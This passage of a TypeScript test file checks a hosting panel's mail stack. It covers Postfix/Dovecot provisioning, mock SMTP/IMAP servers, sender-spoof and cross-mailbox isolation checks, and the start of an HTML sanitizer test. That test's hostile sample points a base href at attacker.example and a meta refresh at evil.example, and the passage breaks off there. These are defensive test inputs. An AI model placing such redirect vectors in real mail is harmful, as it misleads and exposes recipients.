import net from 'node:net'
import { afterEach, describe, expect, it } from 'vitest'
import { FakeHostExecutor } from '@xpanel/agent'
import { aptProfile } from '@xpanel/os'
import { MailServiceAdapter } from '../../../agent/src/services/mail.ts'
import type { ManagedMailDomainSpec } from '../../../agent/src/services/mail.ts'
import {
  MailSecurityAndDeliveryAdapter,
  assertRealMtaQueueId,
} from '../../../agent/src/services/mail-security.ts'
import { SieveAndForwarderAdapter } from '../../../agent/src/services/sieve.ts'
import { ImapProtocolClient } from './imap.ts'
import { MimeCodecAndSanitizer, sanitizeEmailHtml } from './mime.ts'
import { PersonalDataAuthority, toAsciiDigits } from './personal-data.ts'
import { SmtpSubmissionClient } from './smtp.ts'

const os = aptProfile({
  id: 'ubuntu',
  versionId: '24.04',
  versionCodename: 'noble',
  idLike: ['debian'],
  name: 'Ubuntu',
  prettyName: 'Ubuntu 24.04 LTS',
  platformId: '',
  fields: {},
})

const VALID_ARGON2ID_HASH_A =
  '{ARGON2ID}$argon2id$v=19$m=65536,t=3,p=1$c2FsdHNhbHRzYWx0c2FsdA$aGFzaGhhc2hoYXNoaGFzaGhhc2hoYXNoaGFzaGhhc2g'
const VALID_ARGON2ID_HASH_B =
  '{ARGON2ID}$argon2id$v=19$m=65536,t=3,p=1$bmV3c2FsdG5ld3NhbHRuZXc$bmV3aGFzaG5ld2hhc2huZXdoYXNobmV3aGFzaG5ld2g'
const VALID_BLF_CRYPT_HASH =
  '{BLF-CRYPT}$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW'

const ACCOUNT_A = {
  id: 'acc-tenant-a',
  username: 'tenanta',
  uid: 20010,
  gid: 20010,
  home: '/home/tenanta',
  status: 'active' as const,
}

const ACCOUNT_B = {
  id: 'acc-tenant-b',
  username: 'tenantb',
  uid: 20020,
  gid: 20020,
  home: '/home/tenantb',
  status: 'active' as const,
}

// ---------------------------------------------------------------------------
// Local Loopback Wire-Protocol Mock Servers (RFC 3501 IMAP & RFC 5321 SMTP)
// ---------------------------------------------------------------------------

interface StoredWireMessage {
  uid: number
  flags: Set<string>
  internalDate: string
  rawMime: string
}

interface LoopbackMailStore {
  passwords: Map<string, string>
  uidValidityByFolder: Map<string, number>
  nextUidByFolder: Map<string, number>
  foldersByMailbox: Map<string, Map<string, StoredWireMessage[]>>
  submittedQueue: {
    queueId: string
    saslUser: string
    mailFrom: string
    rcptTo: string[]
    rawMime: string
  }[]
  dropAfterDataBeforeAck?: boolean
}

const createLoopbackMailServers = async (store: LoopbackMailStore) => {
  let queueCounter = 100
  const openSockets = new Set<net.Socket>()

  const smtpServer = net.createServer((socket) => {
    openSockets.add(socket)
    socket.on('close', () => openSockets.delete(socket))
    let authedUser: string | null = null
    let mailFrom: string | null = null
    let rcptTo: string[] = []
    let inData = false
    let dataBuf = ''
    let lineBuf = ''

    const send = (line: string) => {
      if (!socket.destroyed) socket.write(`${line}\r\n`)
    }

    send('220 mail.xpanel.internal ESMTP Postfix')

    socket.on('data', (chunk: Buffer) => {
      lineBuf += chunk.toString('utf8')

      while (true) {
        if (inData) {
          const termIdx = lineBuf.indexOf('\r\n.\r\n')
          if (termIdx === -1) break
          const rawData = lineBuf.slice(0, termIdx).replace(/(^|\r\n)\.\./g, '$1.')
          dataBuf += rawData
          lineBuf = lineBuf.slice(termIdx + 5)
          inData = false

          if (store.dropAfterDataBeforeAck) {
            socket.destroy()
            return
          }

          queueCounter++
          const queueId = `4X9kLm${queueCounter}Qz10aB`
          store.submittedQueue.push({
            queueId,
            saslUser: authedUser ?? '',
            mailFrom: mailFrom ?? '',
            rcptTo: [...rcptTo],
            rawMime: dataBuf,
          })

          // Deliver into recipient INBOX folders in the shared loopback store
          for (const rcpt of rcptTo) {
            const mbxFolders = store.foldersByMailbox.get(rcpt)
            if (mbxFolders) {
              const inbox = mbxFolders.get('INBOX') ?? []
              const uvKey = `${rcpt}::INBOX`
              const nextUid = (store.nextUidByFolder.get(uvKey) ?? 1)
              store.nextUidByFolder.set(uvKey, nextUid + 1)
              inbox.push({
                uid: nextUid,
                flags: new Set(),
                internalDate: '22-Oct-2026 12:00:00 +0000',
                rawMime: dataBuf,
              })
              mbxFolders.set('INBOX', inbox)
            }
          }

          dataBuf = ''
          mailFrom = null
          rcptTo = []
          send(`250 2.0.0 Ok: queued as ${queueId}`)
          continue
        }

        const nlIdx = lineBuf.indexOf('\r\n')
        if (nlIdx === -1) break
        const cmdLine = lineBuf.slice(0, nlIdx)
        lineBuf = lineBuf.slice(nlIdx + 2)

        const upper = cmdLine.toUpperCase()
        if (upper.startsWith('EHLO ')) {
          send('250-mail.xpanel.internal')
          send('250-PIPELINING')
          send('250-SIZE 52428800')
          send('250-AUTH PLAIN LOGIN')
          send('250 8BITMIME')
        } else if (upper.startsWith('AUTH PLAIN ')) {
          const b64 = cmdLine.slice('AUTH PLAIN '.length).trim()
          const decoded = Buffer.from(b64, 'base64').toString('utf8')
          const parts = decoded.split('\u0000')
          const user = (parts[1] ?? '').toLowerCase()
          const pass = parts[2] ?? ''
          if (store.passwords.get(user) === pass) {
            authedUser = user
            send('235 2.7.0 Authentication successful')
          } else {
            send('535 5.7.8 Error: authentication failed')
          }
        } else if (upper.startsWith('MAIL FROM:')) {
          if (!authedUser) {
            send('530 5.7.0 Must issue AUTH first')
            continue
          }
          const m = /<([^>]+)>/.exec(cmdLine)
          mailFrom = m ? m[1]!.toLowerCase() : ''
          rcptTo = []
          send('250 2.1.0 Ok')
        } else if (upper.startsWith('RCPT TO:')) {
          const m = /<([^>]+)>/.exec(cmdLine)
          const rcpt = m ? m[1]!.toLowerCase() : ''
          if (rcpt.startsWith('invalid@')) {
            send('550 5.1.1 <invalid@alpha.example>: Recipient address rejected: User unknown')
          } else {
            rcptTo.push(rcpt)
            send('250 2.1.5 Ok')
          }
        } else if (upper === 'DATA') {
          inData = true
          dataBuf = ''
          send('354 End data with <CR><LF>.<CR><LF>')
        } else if (upper === 'QUIT') {
          send('221 2.0.0 Bye')
          socket.end()
        } else {
          send('500 5.5.2 Error: bad syntax')
        }
      }
    })
  })

  const imapServer = net.createServer((socket) => {
    openSockets.add(socket)
    socket.on('close', () => openSockets.delete(socket))
    let authedMailbox: string | null = null
    let selectedFolder: string | null = null
    let recvBuf = Buffer.alloc(0)
    let pendingLiteral: {
      tag: string
      kind: 'append' | 'search'
      folder?: string
      flags?: string[]
      remainingBytes: number
      chunks: Buffer[]
    } | null = null

    const send = (line: string) => {
      if (!socket.destroyed) socket.write(`${line}\r\n`)
    }

    send('* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE MOVE] Dovecot ready.')

    const processBuffer = () => {
      while (true) {
        if (pendingLiteral) {
          if (recvBuf.length < pendingLiteral.remainingBytes + 2) return
          const litContent = recvBuf.subarray(0, pendingLiteral.remainingBytes)
          recvBuf = recvBuf.subarray(pendingLiteral.remainingBytes + 2) // consume literal + CRLF
          const lit = pendingLiteral
          pendingLiteral = null

          if (lit.kind === 'append' && authedMailbox && lit.folder) {
            const mbxFolders = store.foldersByMailbox.get(authedMailbox)!
            const list = mbxFolders.get(lit.folder) ?? []
            const uvKey = `${authedMailbox}::${lit.folder}`
            const uv = store.uidValidityByFolder.get(uvKey) ?? 1001
            const nextUid = store.nextUidByFolder.get(uvKey) ?? 1
            store.nextUidByFolder.set(uvKey, nextUid + 1)
            list.push({
              uid: nextUid,
              flags: new Set(lit.flags ?? []),
              internalDate: '22-Oct-2026 12:05:00 +0000',
              rawMime: litContent.toString('utf8'),
            })
            mbxFolders.set(lit.folder, list)
            send(`${lit.tag} OK [APPENDUID ${uv} ${nextUid}] Append completed.`)
          } else if (lit.kind === 'search' && authedMailbox && selectedFolder) {
            const queryUtf8 = litContent.toString('utf8').toLowerCase()
            const mbxFolders = store.foldersByMailbox.get(authedMailbox)!
            const list = mbxFolders.get(selectedFolder) ?? []
            const codec = new MimeCodecAndSanitizer()
            const matchingUids = list
              .filter((m) => {
                const parsed = codec.parseMimeMessage(m.rawMime)
                return (
                  parsed.subject.toLowerCase().includes(queryUtf8) ||
                  parsed.textBody.toLowerCase().includes(queryUtf8) ||
                  parsed.rawHtmlBody.toLowerCase().includes(queryUtf8) ||
                  parsed.attachments.some((a) => a.filename.toLowerCase().includes(queryUtf8))
                )
              })
              .map((m) => m.uid)
            send(`* SEARCH${matchingUids.length ? ` ${matchingUids.join(' ')}` : ''}`)
            send(`${lit.tag} OK Search completed.`)
          }
          continue
        }

        const nlIdx = recvBuf.indexOf(0x0a)
        if (nlIdx === -1) return
        const line = recvBuf.subarray(0, nlIdx + 1).toString('utf8').replace(/\r?\n$/, '')
        recvBuf = recvBuf.subarray(nlIdx + 1)

        const spaceIdx = line.indexOf(' ')
        if (spaceIdx <= 0) continue
        const tag = line.slice(0, spaceIdx)
        const rest = line.slice(spaceIdx + 1)
        const upper = rest.toUpperCase()

        if (upper.startsWith('LOGIN ')) {
          const m = /^LOGIN\s+"([^"]+)"\s+"([^"]+)"/i.exec(rest)
          const user = (m?.[1] ?? '').toLowerCase()
          const pass = m?.[2] ?? ''
          if (store.passwords.get(user) === pass) {
            authedMailbox = user
            send(`${tag} OK Logged in`)
          } else {
            send(`${tag} NO [AUTHENTICATIONFAILED] Authentication failed.`)
          }
        } else if (upper.startsWith('LIST ')) {
          if (!authedMailbox) {
            send(`${tag} NO Not authenticated`)
            continue
          }
          const mbxFolders = store.foldersByMailbox.get(authedMailbox) ?? new Map()
          for (const folderName of mbxFolders.keys()) {
            send(`* LIST (\\HasNoChildren) "." "${folderName}"`)
          }
          send(`${tag} OK List completed.`)
        } else if (upper.startsWith('SELECT ')) {
          if (!authedMailbox) {
            send(`${tag} NO Not authenticated`)
            continue
          }
          const m = /^SELECT\s+"([^"]+)"/i.exec(rest)
          const folder = m?.[1] ?? 'INBOX'
          const mbxFolders = store.foldersByMailbox.get(authedMailbox)
          const list = mbxFolders?.get(folder)
          if (!list) {
            send(`${tag} NO Mailbox doesn't exist: ${folder}`)
            continue
          }
          selectedFolder = folder
          const uvKey = `${authedMailbox}::${folder}`
          const uv = store.uidValidityByFolder.get(uvKey) ?? 1001
          const nextUid = store.nextUidByFolder.get(uvKey) ?? (list.length + 1)
          send(`* FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft)`)
          send(`* ${list.length} EXISTS`)
          send(`* 0 RECENT`)
          send(`* OK [UIDVALIDITY ${uv}] UIDs valid`)
          send(`* OK [UIDNEXT ${nextUid}] Predicted next UID`)
          send(`${tag} OK [READ-WRITE] Select completed.`)
        } else if (upper.startsWith('UID FETCH ')) {
          if (!authedMailbox || !selectedFolder) {
            send(`${tag} NO Select a folder first`)
            continue
          }
          const m = /^UID FETCH\s+([^\s]+)\s+/i.exec(rest)
          const seqSpec = m?.[1] ?? '1:*'
          const list = store.foldersByMailbox.get(authedMailbox)?.get(selectedFolder) ?? []
          const matched = list.filter((msg) => {
            if (seqSpec === '1:*') return true
            return seqSpec.split(',').some((part) => Number.parseInt(part, 10) === msg.uid)
          })

          matched.forEach((msg, idx) => {
            const rawBuf = Buffer.from(msg.rawMime, 'utf8')
            const flagStr = [...msg.flags].join(' ')
            const headerLine = `* ${idx + 1} FETCH (UID ${msg.uid} FLAGS (${flagStr}) INTERNALDATE "${msg.internalDate}" RFC822.SIZE ${rawBuf.length} BODY[] {${rawBuf.length}}\r\n`
            socket.write(headerLine)
            socket.write(rawBuf)
            socket.write(')\r\n')
          })
          send(`${tag} OK Fetch completed.`)
        } else if (upper.startsWith('UID STORE ')) {
          if (!authedMailbox || !selectedFolder) {
            send(`${tag} NO Select a folder first`)
            continue
          }
          const m = /^UID STORE\s+(\d+)\s+([+-]?FLAGS(?:\.SILENT)?)\s+\(([^)]*)\)/i.exec(rest)
          if (m) {
            const uid = Number.parseInt(m[1]!, 10)
            const action = m[2]!.toUpperCase()
            const flags = (m[3] ?? '').split(/\s+/).filter(Boolean)
            const list = store.foldersByMailbox.get(authedMailbox)?.get(selectedFolder) ?? []
            const target = list.find((item) => item.uid === uid)
            if (target) {
              if (action.startsWith('+')) {
                for (const f of flags) target.flags.add(f)
              } else if (action.startsWith('-')) {
                for (const f of flags) target.flags.delete(f)
              } else {
                target.flags = new Set(flags)
              }
            }
          }
          send(`${tag} OK Store completed.`)
        } else if (upper.startsWith('UID MOVE ') || upper.startsWith('UID COPY ')) {
          if (!authedMailbox || !selectedFolder) {
            send(`${tag} NO Select a folder first`)
            continue
          }
          const isMove = upper.startsWith('UID MOVE ')
          const m = /^UID (?:MOVE|COPY)\s+(\d+)\s+"([^"]+)"/i.exec(rest)
          const uid = Number.parseInt(m?.[1] ?? '0', 10)
          const targetFolder = m?.[2] ?? 'Trash'
          const mbxFolders = store.foldersByMailbox.get(authedMailbox)!
          const srcList = mbxFolders.get(selectedFolder) ?? []
          const dstList = mbxFolders.get(targetFolder) ?? []
          const msgIdx = srcList.findIndex((item) => item.uid === uid)
          if (msgIdx >= 0) {
            const msg = srcList[msgIdx]!
            const uvKey = `${authedMailbox}::${targetFolder}`
            const nextUid = store.nextUidByFolder.get(uvKey) ?? (dstList.length + 1)
            store.nextUidByFolder.set(uvKey, nextUid + 1)
            dstList.push({
              uid: nextUid,
              flags: new Set(msg.flags),
              internalDate: msg.internalDate,
              rawMime: msg.rawMime,
            })
            mbxFolders.set(targetFolder, dstList)
            if (isMove) {
              srcList.splice(msgIdx, 1)
            }
          }
          send(`${tag} OK ${isMove ? 'Move' : 'Copy'} completed.`)
        } else if (upper.startsWith('UID SEARCH CHARSET UTF-8 TEXT ')) {
          const litMatch = /\{(\d+)\}$/.exec(rest)
          if (litMatch) {
            pendingLiteral = {
              tag,
              kind: 'search',
              remainingBytes: Number.parseInt(litMatch[1]!, 10),
              chunks: [],
            }
            send('+ Ready for literal data')
          } else {
            send(`${tag} BAD Missing literal`)
          }
        } else if (upper === 'UID SEARCH ALL') {
          const list =
            (authedMailbox && selectedFolder
              ? store.foldersByMailbox.get(authedMailbox)?.get(selectedFolder)
              : []) ?? []
          const uids = list.map((m) => m.uid)
          send(`* SEARCH${uids.length ? ` ${uids.join(' ')}` : ''}`)
          send(`${tag} OK Search completed.`)
        } else if (upper.startsWith('APPEND ')) {
          const m = /^APPEND\s+"([^"]+)"\s+\(([^)]*)\)\s+\{(\d+)\}$/i.exec(rest)
          if (m) {
            pendingLiteral = {
              tag,
              kind: 'append',
              folder: m[1]!,
              flags: (m[2] ?? '').split(/\s+/).filter(Boolean),
              remainingBytes: Number.parseInt(m[3]!, 10),
              chunks: [],
            }
            send('+ Ready for literal data')
          } else {
            send(`${tag} BAD Malformed APPEND`)
          }
        } else if (upper === 'LOGOUT') {
          send('* BYE Logging out')
          send(`${tag} OK Logout completed.`)
          socket.end()
        } else {
          send(`${tag} BAD Unknown command`)
        }
      }
    }

    socket.on('data', (chunk: Buffer) => {
      recvBuf = Buffer.concat([recvBuf, chunk])
      processBuffer()
    })
  })

  await new Promise<void>((resolve) => smtpServer.listen(0, '127.0.0.1', () => resolve()))
  await new Promise<void>((resolve) => imapServer.listen(0, '127.0.0.1', () => resolve()))

  const smtpPort = (smtpServer.address() as net.AddressInfo).port
  const imapPort = (imapServer.address() as net.AddressInfo).port

  return {
    smtpPort,
    imapPort,
    close: async () => {
      for (const s of openSockets) {
        s.destroy()
      }
      openSockets.clear()
      await new Promise<void>((resolve) => smtpServer.close(() => resolve()))
      await new Promise<void>((resolve) => imapServer.close(() => resolve()))
    },
  }
}

describe('M01–M05 Mail, Webmail, DKIM/Queue Security, Sieve & Personal Data Suite (A08, A42, A43, A44, A45, A46)', () => {
  const activeServers: (() => Promise<void>)[] = []

  afterEach(async () => {
    while (activeServers.length > 0) {
      const stop = activeServers.pop()!
      await stop()
    }
  })

  // =========================================================================
  // 1. M01: Postfix + Dovecot Provisioning, Quota Layers, Suspension & Auth Flush (A42)
  // =========================================================================
  it('M01 (A42): provisions Postfix virtual maps, Dovecot passdb/userdb, 0750 Maildirs, suspension rules, and flushes auth cache on password change/delete', async () => {
    const executor = new FakeHostExecutor()
    const adapter = new MailServiceAdapter({
      executor,
      os,
      mapType: 'lmdb',
      postmasterAddress: 'postmaster@alpha.example',
      tls: {
        certFile: '/etc/xpanel/tls/mail.crt',
        keyFile: '/etc/xpanel/tls/mail.key',
      },
    })

    const domains: ManagedMailDomainSpec[] = [
      {
        domain: 'alpha.example',
        account: ACCOUNT_A,
        mailboxes: [
          {
            local: 'alice',
            domain: 'alpha.example',
            passwordHash: VALID_ARGON2ID_HASH_A,
            quotaMb: 512,
          },
          {
            local: 'suspendedbox',
            domain: 'alpha.example',
            passwordHash: VALID_BLF_CRYPT_HASH,
            quotaMb: 256,
            suspendLogin: true,
            suspendIncoming: true,
            suspendOutgoing: true,
          },
        ],
        forwarders: [{ local: 'info', to: ['alice@alpha.example'] }],
      },
      {
        domain: 'beta.example',
        account: ACCOUNT_B,
        mailboxes: [
          {
            local: 'eve',
            domain: 'beta.example',
            passwordHash: VALID_ARGON2ID_HASH_A,
            quotaMb: 1024,
          },
        ],
      },
    ]

    const plan = await adapter.applyProvisionPlan(domains)

    // Verify Maildir hierarchy created under owning account UID/GID with 0750 permissions
    expect(plan.maildirPaths).toContain('/home/tenanta/mail/alpha.example/alice')
    expect(plan.maildirPaths).toContain('/home/tenantb/mail/beta.example/eve')
    expect(executor.dirs.get('/home/tenanta/mail/alpha.example/alice/cur')).toEqual({
      mode: 0o750,
      owner: 'tenanta',
      group: 'tenanta',
    })
    expect(executor.dirs.get('/home/tenantb/mail/beta.example/eve/.Sent/cur')).toEqual({
      mode: 0o750,
      owner: 'tenantb',
      group: 'tenantb',
    })

    // Verify Dovecot per-domain passwd-file content (UID/GID, quota_rule, nologin on suspended)
    const alphaPasswd = executor.files.get('/etc/dovecot/xpanel/domains/alpha.example.passwd')
    expect(alphaPasswd).toBeDefined()
    expect(alphaPasswd?.mode).toBe(0o640)
    expect(alphaPasswd?.group).toBe('dovecot')
    expect(alphaPasswd?.content).toContain(
      `alice@alpha.example:${VALID_ARGON2ID_HASH_A}:20010:20010::/home/tenanta::userdb_mail=maildir:~/mail/alpha.example/alice userdb_quota_rule=*:storage=512M`,
    )
    expect(alphaPasswd?.content).toContain('suspendedbox@alpha.example:')
    expect(alphaPasswd?.content).toContain('nologin=y reason=suspended')

    // Verify Postfix incoming and outgoing suspension enforcement
    const recipientAccess = executor.files.get('/etc/postfix/xpanel/recipient_access')
    expect(recipientAccess?.content).toContain(
      'suspendedbox@alpha.example\tREJECT 5.2.1 mailbox is not accepting mail',
    )
    const senderAccess = executor.files.get('/etc/postfix/xpanel/sender_access')
    expect(senderAccess?.content).toContain(
      'suspendedbox@alpha.example\tREJECT 5.7.1 Outbound mail submission is suspended for this mailbox',
    )
    const senderLogins = executor.files.get('/etc/postfix/xpanel/sender_logins')
    expect(senderLogins?.content).toContain(
      'suspendedbox@alpha.example\tnobody@xpanel-sender.invalid',
    )

    // Verify postmap compilation and config tests ran
    expect(executor.executedTests.map((t) => t.name)).toEqual(['postfix', 'dovecot'])
    const postmapActions = executor.executedActions.filter(
      (a) => a.kind === 'exec' && a.argv[0] === '/usr/sbin/postmap',
    )
    expect(postmapActions.length).toBeGreaterThanOrEqual(7)

    // Rotate password for alice@alpha.example and verify immediate Dovecot auth cache flush + kick
    await adapter.rotateMailboxPassword(domains, 'alice@alpha.example', VALID_ARGON2ID_HASH_B)
    const updatedPasswd = executor.files.get('/etc/dovecot/xpanel/domains/alpha.example.passwd')
    expect(updatedPasswd?.content).toContain(VALID_ARGON2ID_HASH_B)
    expect(updatedPasswd?.content).not.toContain(VALID_ARGON2ID_HASH_A)
    expect(executor.executedCommands).toContainEqual([
      '/usr/bin/doveadm',
      'auth',
      'cache',
      'flush',
      'alice@alpha.example',
    ])
    expect(executor.executedCommands).toContainEqual([
      '/usr/bin/doveadm',
      'kick',
      'alice@alpha.example',
    ])

    // Delete suspendedbox@alpha.example and verify the Maildir is removed with the mailbox
    const delRes = await adapter.deleteMailbox(domains, 'suspendedbox@alpha.example')
    expect(delRes.deletedAddress).toBe('suspendedbox@alpha.example')
    expect(delRes.removedMaildirPath).toBe('/home/tenanta/mail/alpha.example/suspendedbox')
    const afterDeletePasswd = executor.files.get('/etc/dovecot/xpanel/domains/alpha.example.passwd')
    expect(afterDeletePasswd?.content).not.toContain('suspendedbox@alpha.example')

    // Verify quota layer diagnostics (Dovecot mailbox quota 552 vs Linux filesystem EDQUOT 452)
    const mbxQuotaDiag = adapter.diagnoseDeliveryQuota({
      mailbox: 'alice@alpha.example',
      account: ACCOUNT_A,
      mailboxQuotaMb: 100,
      accountDiskQuotaMb: 1024,
      usedMailboxBytes: 99 * 1024 * 1024,
      usedAccountBytes: 200 * 1024 * 1024,
      incomingMessageBytes: 5 * 1024 * 1024,
    })
    expect(mbxQuotaDiag.limitingLayer).toBe('mailbox_dovecot_quota')
    expect(mbxQuotaDiag.lmtpStatus).toBe('552 5.2.2 Quota exceeded (mailbox full)')

    const fsQuotaDiag = adapter.diagnoseDeliveryQuota({
      mailbox: 'alice@alpha.example',
      account: ACCOUNT_A,
      mailboxQuotaMb: 500,
      accountDiskQuotaMb: 250,
      usedMailboxBytes: 50 * 1024 * 1024,
      usedAccountBytes: 248 * 1024 * 1024,
      incomingMessageBytes: 5 * 1024 * 1024,
    })
    expect(fsQuotaDiag.limitingLayer).toBe('account_filesystem_quota')
    expect(fsQuotaDiag.lmtpStatus).toBe('452 4.2.2 Account filesystem quota exceeded (EDQUOT)')
  })

  // =========================================================================
  // 2. M02: Real Wire-Protocol SMTP & IMAP Clients, Isolation & Idempotency (A08, A42, A44)
  // =========================================================================
  it('M02 (A08, A42): executes real SMTP submission and IMAP protocol operations, enforces cross-mailbox isolation, UIDVALIDITY resync, and post-DATA timeout idempotency', async () => {
    const store: LoopbackMailStore = {
      passwords: new Map([
        ['alice@alpha.example', 'AliceSecret!2026'],
        ['eve@beta.example', 'EveSecret!2026'],
      ]),
      uidValidityByFolder: new Map([
        ['alice@alpha.example::INBOX', 1001],
        ['alice@alpha.example::Sent', 2001],
        ['alice@alpha.example::Drafts', 3001],
        ['alice@alpha.example::Archive', 4001],
        ['eve@beta.example::INBOX', 5001],
      ]),
      nextUidByFolder: new Map([
        ['alice@alpha.example::INBOX', 1],
        ['alice@alpha.example::Sent', 1],
        ['alice@alpha.example::Drafts', 1],
        ['alice@alpha.example::Archive', 1],
        ['eve@beta.example::INBOX', 1],
      ]),
      foldersByMailbox: new Map([
        [
          'alice@alpha.example',
          new Map([
            ['INBOX', []],
            ['Sent', []],
            ['Drafts', []],
            ['Archive', []],
          ]),
        ],
        ['eve@beta.example', new Map([['INBOX', []]])],
      ]),
      submittedQueue: [],
    }

    const servers = await createLoopbackMailServers(store)
    activeServers.push(servers.close)

    const smtp = new SmtpSubmissionClient({
      host: '127.0.0.1',
      port: servers.smtpPort,
      tls: false,
    })

    // A08: Mailbox A (alice@alpha.example) attempts to send with From belonging to Mailbox B (eve@beta.example)
    await expect(
      smtp.submitMessage(
        { username: 'alice@alpha.example', password: 'AliceSecret!2026' },
        {
          idempotencyKey: 'spoof-attempt-1',
          authenticatedMailbox: 'alice@alpha.example',
          from: 'eve@beta.example',
          to: ['alice@alpha.example'],
          subject: 'Spoofed sender attempt',
          textBody: 'Should be blocked before SMTP MAIL FROM',
        },
      ),
    ).rejects.toThrow(/sender identity "eve@beta\.example" is not authorized/)
    expect(store.submittedQueue).toHaveLength(0)

    // Positive SMTP submission with Arabic subject, inline CID image, and Arabic attachment filename
    const tinyPngBytes = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64',
    )

    const sendRes = await smtp.submitMessage(
      { username: 'alice@alpha.example', password: 'AliceSecret!2026' },
      {
        idempotencyKey: 'send-msg-1',
        authenticatedMailbox: 'alice@alpha.example',
        authorizedIdentities: ['sales@alpha.example'],
        from: 'alice@alpha.example',
        fromName: 'أليس — قسم المبيعات',
        to: ['alice@alpha.example', 'eve@beta.example'],
        subject: 'رسالة اختبار حقيقية MARKER_TENANT_A_ALICE',
        textBody: 'مرحباً، هذا نص الرسالة التجريبية.',
        htmlBody: '<div dir="rtl"><p>مرحباً <strong>أليس</strong></p><img src="cid:logo123@alpha.example" /></div>',
        attachments: [
          {
            filename: 'logo.png',
            contentType: 'image/png',
            content: tinyPngBytes,
            contentId: 'logo123@alpha.example',
            inline: true,
          },
          {
            filename: 'تقرير_الربع_الأول_2026.pdf',
            contentType: 'application/pdf',
            content: Buffer.from('%PDF-1.7-MARKER_ATTACHMENT_ALICE', 'utf8'),
          },
        ],
      },
    )

    expect(sendRes.submissionStatus).toBe('accepted_by_mta')
    expect(sendRes.mtaQueueId).toMatch(/^4X9kLm\d+Qz10aB$/)
    expect(sendRes.smtpCode).toBe(250)

    // Connect real IMAP client for alice@alpha.example
    const imapAlice = new ImapProtocolClient({
      host: '127.0.0.1',
      port: servers.imapPort,
      tls: false,
    })
    await imapAlice.login('alice@alpha.example', 'AliceSecret!2026')

    // Append sent copy to Sent folder
    const appendRes = await imapAlice.appendMessage('Sent', sendRes.rawMime, ['\\Seen'])
    expect(appendRes.appendedUid).toBe(1)

    // List folders
    const folders = await imapAlice.listFolders()
    expect(folders.map((f) => f.name)).toEqual(['INBOX', 'Sent', 'Drafts', 'Archive'])

    // Search in INBOX using UTF-8 Arabic query
    const matchingUids = await imapAlice.searchByUtf8Query('INBOX', 'رسالة اختبار حقيقية')
    expect(matchingUids).toEqual([1])

    // Fetch message by UID
    const fetched = await imapAlice.fetchMessagesByUid('INBOX', 1)
    expect(fetched.state.uidValidity).toBe(1001)
    expect(fetched.state.resynced).toBe(false)
    expect(fetched.messages).toHaveLength(1)

    const msg = fetched.messages[0]!
    expect(msg.parsed.messageId).toBe(sendRes.messageId)
    expect(msg.parsed.subject).toBe('رسالة اختبار حقيقية MARKER_TENANT_A_ALICE')
    expect(msg.parsed.sanitizedHtmlBody).toContain('data-cid-resolved="true"')
    expect(msg.parsed.sanitizedHtmlBody).toContain('data:image/png;base64,')

    const pdfTokenEntry = msg.attachmentTokens.find(
      (a) => a.filename === 'تقرير_الربع_الأول_2026.pdf',
    )
    expect(pdfTokenEntry).toBeDefined()

    // Owner can download attachment
    const dl = imapAlice.authorizeAttachmentDownload('alice@alpha.example', pdfTokenEntry!.token)
    expect(dl.content.toString('utf8')).toBe('%PDF-1.7-MARKER_ATTACHMENT_ALICE')

    // A08: Mailbox B (eve@beta.example) attempts to download Mailbox A's attachment token -> FORBIDDEN
    expect(() =>
      imapAlice.authorizeAttachmentDownload('eve@beta.example', pdfTokenEntry!.token),
    ).toThrow(/cross-mailbox attachment download is forbidden/)

    // A08: Attempting to use Alice's IMAP client with requestedMailbox=eve@beta.example -> FORBIDDEN
    await expect(imapAlice.listFolders('eve@beta.example')).rejects.toThrow(
      /cross-mailbox IMAP operation is forbidden/,
    )

    // Store flags & Move message
    await imapAlice.storeFlagsByUid('INBOX', 1, 'add', ['\\Seen', '\\Flagged'])
    const refetched = await imapAlice.fetchMessagesByUid('INBOX', 1)
    expect(refetched.messages[0]!.flags).toEqual(expect.arrayContaining(['\\Seen', '\\Flagged']))

    await imapAlice.moveOrCopyByUid('INBOX', 1, 'Archive', 'copy')
    const archiveFetched = await imapAlice.fetchMessagesByUid('Archive', 1)
    expect(archiveFetched.messages).toHaveLength(1)

    // Simulate UIDVALIDITY change on INBOX (1001 -> 1009) and verify automatic resync & token invalidation
    store.uidValidityByFolder.set('alice@alpha.example::INBOX', 1009)
    const afterUvChange = await imapAlice.selectFolder('INBOX')
    expect(afterUvChange.uidValidity).toBe(1009)
    expect(afterUvChange.previousUidValidity).toBe(1001)
    expect(afterUvChange.resynced).toBe(true)

    expect(() =>
      imapAlice.authorizeAttachmentDownload('alice@alpha.example', pdfTokenEntry!.token),
    ).toThrow(/mailbox UIDVALIDITY changed; resync required/)

    await imapAlice.logout()

    // Test post-DATA timeout idempotency: server drops connection after receiving DATA before sending 250 ACK
    store.dropAfterDataBeforeAck = true
    await expect(
      smtp.submitMessage(
        { username: 'alice@alpha.example', password: 'AliceSecret!2026' },
        {
          idempotencyKey: 'timeout-after-data-key',
          authenticatedMailbox: 'alice@alpha.example',
          from: 'alice@alpha.example',
          to: ['eve@beta.example'],
          subject: 'Timeout after DATA test',
          textBody: 'Body sent before drop',
        },
      ),
    ).rejects.toThrow()

    const stateAfterDrop = smtp.getSubmissionState('timeout-after-data-key')
    expect(stateAfterDrop?.phase).toBe('data_transmitted_awaiting_ack')

    // Retrying with the same idempotencyKey must be refused with CONFLICT (never blindly resent!)
    store.dropAfterDataBeforeAck = false
    await expect(
      smtp.submitMessage(
        { username: 'alice@alpha.example', password: 'AliceSecret!2026' },
        {
          idempotencyKey: 'timeout-after-data-key',
          authenticatedMailbox: 'alice@alpha.example',
          from: 'alice@alpha.example',
          to: ['eve@beta.example'],
          subject: 'Timeout after DATA test',
          textBody: 'Body sent before drop',
        },
      ),
    ).rejects.toThrow(/SMTP DATA was already transmitted before timeout; refusing blind resend/)
  })

  // =========================================================================
  // 3. M02/M03: Hostile HTML/MIME Sanitization & Bomb Guards (A44)
  // =========================================================================
  it('M02/M03 (A44): neutralizes hostile HTML/CSS/URI vectors, blocks remote tracking pixels, strips BiDi filename spoofing, and rejects MIME nesting bombs', () => {
    const hostileHtml = `
      <html>
        <head><title>Evil</title><base href="https://attacker.example/" /><meta http-equiv="refresh" content="0;url=https://evil.example" /></head>
        <body>
